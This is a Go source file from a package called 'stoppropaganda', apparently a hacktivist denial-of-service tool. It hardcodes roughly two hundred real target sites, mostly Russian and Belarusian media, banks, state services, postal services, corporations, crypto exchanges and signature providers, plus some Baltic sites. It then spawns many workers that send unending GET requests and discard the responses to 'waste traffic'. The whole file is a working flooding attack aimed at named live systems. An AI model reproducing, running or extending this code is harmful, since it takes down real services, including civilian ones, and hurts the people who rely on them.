package stoppropaganda

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"sync"
	"time"
)

// Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233

const VALIDATE_DNS_EVERY = 5 * time.Minute

var targetWebsites = map[string]struct{}{
	/* Other countries */

	"https://bukimevieningi.lt": {},
	"https://musutv.lt":         {},
	"https://baltnews.lt":       {},
	"https://lt.rubaltic.ru":    {},
	"http://sputniknews.lt":     {},
	"https://lv.sputniknews.ru": {},
	"https://viada.lt":          {},

	/* Russia */

	// Propaganda
	"https://lenta.ru":          {},
	"https://ria.ru":            {},
	"https://ria.ru/lenta":      {},
	"https://www.rbc.ru":        {},
	"https://www.rt.com":        {},
	"https://smotrim.ru":        {},
	"https://tass.ru":           {},
	"https://tvzvezda.ru":       {},
	"https://vsoloviev.ru":      {},
	"https://www.1tv.ru":        {},
	"https://www.vesti.ru":      {},
	"https://zakupki.gov.ru":    {},
	"https://er.ru":             {},
	"https://www.rzd.ru":        {},
	"https://rzdlog.ru":         {},
	"https://vgtrk.ru":          {},
	"https://www.interfax.ru":   {},
	"https://ugmk.ua":           {},
	"https://iz.ru":             {},
	"https://vz.ru":             {},
	"https://sputniknews.ru":    {},
	"https://www.gazeta.ru":     {},
	"https://www.kp.ru":         {},
	"https://riafan.ru":         {},
	"https://pikabu.ru":         {},
	"https://www.kommersant.ru": {},
	"https://omk.ru":            {},
	"https://www.yaplakal.com":  {},
	"https://bezformata.com":    {},
	"https://regnum.ru":         {},
	"https://eadaily.com":       {},
	"https://www.rubaltic.ru":   {},

	// Business corporations
	"https://www.gazprom.ru":                    {},
	"https://lukoil.ru":                         {},
	"https://magnit.ru":                         {},
	"https://www.nornickel.com":                 {},
	"https://www.surgutneftegas.ru":             {},
	"https://www.tatneft.ru":                    {},
	"https://www.evraz.com/ru":                  {},
	"https://nlmk.com":                          {},
	"https://www.sibur.ru":                      {},
	"https://www.severstal.com":                 {},
	"https://www.metalloinvest.com":             {},
	"https://nangs.org":                         {},
	"https://rmk-group.ru/ru":                   {},
	"https://www.tmk-group.ru":                  {},
	"https://ya.ru":                             {},
	"https://www.polymetalinternational.com/ru": {},
	"https://www.uralkali.com/ru":               {},
	"https://www.eurosib.ru":                    {},

	// Banks
	"https://www.sberbank.ru":                          {},
	"https://online.sberbank.ru":                       {},
	"https://www.vtb.ru":                               {},
	"https://www.gazprombank.ru":                       {},
	"https://api.developer.sber.ru/product/SberbankID": {},
	"https://api.sberbank.ru/prod/tokens/v2":           {},
	"https://api.sberbank.ru/prod/tokens/v2/oauth":     {},
	"https://api.sberbank.ru/prod/tokens/v2/oidc":      {},
	"https://www.moex.com":                             {},
	"http://www.fsb.ru":                                {},

	//The state
	"https://gosuslugi.ru":         {},
	"https://www.mos.ru/uslugi":    {},
	"http://kremlin.ru":            {},
	"http://en.kremlin.ru":         {},
	"http://government.ru":         {},
	"https://mil.ru":               {},
	"https://www.nalog.gov.ru":     {},
	"https://customs.gov.ru":       {},
	"https://pfr.gov.ru":           {},
	"https://rkn.gov.ru":           {},
	"https://www.gosuslugi.ru":     {},
	"https://gosuslugi41.ru":       {},
	"https://uslugi27.ru":          {},
	"https://gosuslugi29.ru":       {},
	"https://gosuslugi.astrobl.ru": {},
	"http://pochta.ru":             {},
	"http://crimea-post.ru":        {},

	// Others
	"https://109.207.1.118":          {},
	"https://109.207.1.97":           {},
	"https://mail.rkn.gov.ru":        {},
	"https://cloud.rkn.gov.ru":       {},
	"https://mvd.gov.ru":             {},
	"https://pwd.wto.economy.gov.ru": {},
	"https://stroi.gov.ru":           {},
	"https://proverki.gov.ru":        {},
	"https://shop-rt.com":            {},

	// Exchanges connected to russian banks
	"https://cleanbtc.ru":       {},
	"https://bonkypay.com":      {},
	"https://changer.club":      {},
	"https://superchange.net":   {},
	"https://mine.exchange":     {},
	"https://platov.co":         {},
	"https://ww-pay.net":        {},
	"https://delets.cash":       {},
	"https://betatransfer.org":  {},
	"https://ramon.money":       {},
	"https://coinpaymaster.com": {},
	"https://bitokk.biz":        {},
	"https://www.netex24.net":   {},
	"https://cashbank.pro":      {},
	"https://flashobmen.com":    {},
	"https://abcobmen.com":      {},
	"https://ychanger.net":      {},
	"https://multichange.net":   {},
	"https://24paybank.ne":      {},
	"https://royal.cash":        {},
	"https://prostocash.com":    {},
	"https://baksman.org":       {},
	"https://kupibit.me":        {},

	// Electronic signature services
	"https://iecp.ru":             {},
	"https://uc-osnovanie.ru":     {},
	"http://www.nucrf.ru":         {},
	"http://www.belinfonalog.ru":  {},
	"http://www.roseltorg.ru":     {},
	"http://www.astralnalog.ru":   {},
	"http://www.nwudc.ru":         {},
	"http://www.center-inform.ru": {},
	"https://kk.bank/UdTs":        {},
	"http://structure.mil.ru":     {},
	"http://www.ucpir.ru":         {},
	"http://dreamkas.ru":          {},
	"http://www.e-portal.ru":      {},
	"http://izhtender.ru":         {},
	"http://imctax.parus-s.ru":    {},
	"http://www.icentr.ru":        {},
	"http://www.kartoteka.ru":     {},
	"http://rsbis.ru":             {},
	"http://www.stv-it.ru":        {},
	"http://www.crypset.ru":       {},
	"http://www.kt-69.ru":         {},
	"http://www.24ecp.ru":         {},
	"http://kraskript.com":        {},
	"http://ca.ntssoft.ru":        {},
	"http://www.y-center.ru":      {},
	"http://www.rcarus.ru":        {},
	"http://rk72.ru":              {},
	"http://squaretrade.ru":       {},
	"http://ca.gisca.ru":          {},
	"http://www.otchet-online.ru": {},
	"http://udcs.ru":              {},
	"http://www.cit-ufa.ru":       {},
	"http://elkursk.ru":           {},
	"http://www.icvibor.ru":       {},
	"http://ucestp.ru":            {},
	"http://mcspro.ru":            {},
	"http://www.infotrust.ru":     {},
	"http://epnow.ru":             {},
	"http://ca.kamgov.ru":         {},
	"http://mascom-it.ru":         {},
	"http://cfmc.ru":              {},

	/* BELARUS */

	// by gov
	"https://mininform.gov.by":       {},
	"https://rec.gov.by/ru":          {},
	"https://www.mil.by":             {},
	"https://www.government.by":      {},
	"https://president.gov.by/ru":    {},
	"https://www.mvd.gov.by/ru":      {},
	"http://www.kgb.by/ru":           {},
	"https://www.prokuratura.gov.by": {},
	

	// by banks
	"https://www.nbrb.by":                 {},
	"https://belarusbank.by":              {},
	"https://brrb.by":                     {},
	"https://www.belapb.by":               {},
	"https://bankdabrabyt.by":             {},
	"https://belinvestbank.by/individual": {},
	"https://belpost.by":                  {},
	
	// by business
	"https://bgp.by/ru":           {},
	"https://www.belneftekhim.by": {},
	"http://www.bellegprom.by":    {},
	"https://www.energo.by":       {},
	"http://belres.by/ru":         {},

	// by media
	"http://belta.by":           {},
	"https://sputnik.by":        {},
	"https://www.tvr.by":        {},
	"https://www.sb.by":         {},
	"https://belmarket.by":      {},
	"https://www.belarus.by":    {},
	"https://belarus24.by":      {},
	"https://ont.by":            {},
	"https://www.024.by":        {},
	"https://www.belnovosti.by": {},
	"https://mogilevnews.by":    {},
	"https://yandex.by":         {},
	"https://www.slonves.by":    {},
	"http://www.ctv.by":         {},
	"https://radiobelarus.by":   {},
	"https://radiusfm.by":       {},
	"https://alfaradio.by":      {},
	"https://radiomir.by":       {},
	"https://radiostalica.by":   {},
	"https://radiobrestfm.by":   {},
	"https://www.tvrmogilev.by": {},
	"https://minsknews.by":      {},
	"https://zarya.by":          {},
	"https://grodnonews.by":     {},
}

var websites = map[string]*Website{}

type Website struct {
	Requests      uint   `json:"requests"`
	Errors        uint   `json:"errors"`
	LastErrorMsg  string `json:"last_error_msg"`
	WorkersStatus string `json:"workers_status"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`

	mux *sync.Mutex
}

func (ws *Website) Start(endpoint string) {
	websiteURL, err := url.Parse(endpoint)
	if err != nil {
		panic(err)
	}

	// Create request
	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		panic(err)
	}

	// Set headers
	req.Header.Set("Host", websiteURL.Host)
	req.Header.Set("User-Agent", *flagUserAgent)
	req.Header.Set("Accept", "*/*")

	ws.WorkersStatus = "Initializing"
	pauseMux := sync.Mutex{}
	dnsLastChecked := time.Now().Add(-1 * VALIDATE_DNS_EVERY) // this forces to validate on first run

	f := func() {
		for {
			pauseMux.Lock()
			if time.Since(dnsLastChecked) >= VALIDATE_DNS_EVERY {
				ipIsPrivate, err := isPrivateIP(websiteURL.Host)
				if err != nil {
					ws.mux.Lock()
					ws.WorkersStatus = fmt.Sprint("Unable to validate DNS:", err)
					ws.mux.Unlock()
					time.Sleep(3 * time.Second)
					pauseMux.Unlock()
					continue
				}

				if ipIsPrivate {
					ws.mux.Lock()
					ws.WorkersStatus = fmt.Sprint("Private IP detected, DOS paused, will recheck in ", VALIDATE_DNS_EVERY.String())
					ws.mux.Unlock()
					time.Sleep(VALIDATE_DNS_EVERY)
					pauseMux.Unlock()
					continue
				}

				ws.mux.Lock()
				ws.WorkersStatus = "Running"
				ws.mux.Unlock()
				dnsLastChecked = time.Now()
			}
			pauseMux.Unlock()

			// Perform request
			resp, err := httpClient.Do(req)
			if err != nil {
				ws.mux.Lock()
				ws.Requests++
				ws.Errors++
				ws.LastErrorMsg = err.Error()
				ws.mux.Unlock()
				continue
			}

			// Increase counters
			ws.mux.Lock()
			ws.Requests++
			if resp.StatusCode < 200 {
				ws.Counter_code100++
			} else if resp.StatusCode < 300 {
				ws.Counter_code200++
			} else if resp.StatusCode < 400 {
				ws.Counter_code300++
			} else if resp.StatusCode < 500 {
				ws.Counter_code400++
			} else {
				ws.Counter_code500++
			}
			ws.mux.Unlock()

			// Download (and discard) response body to waste traffic
			_, err = io.Copy(ioutil.Discard, resp.Body)
			if err != nil {
				ws.mux.Lock()
				ws.Errors++
				ws.mux.Unlock()
			}
			resp.Body.Close()
		}
	}

	for i := 0; i < *flagWorkers; i++ {
		go f()
	}
}
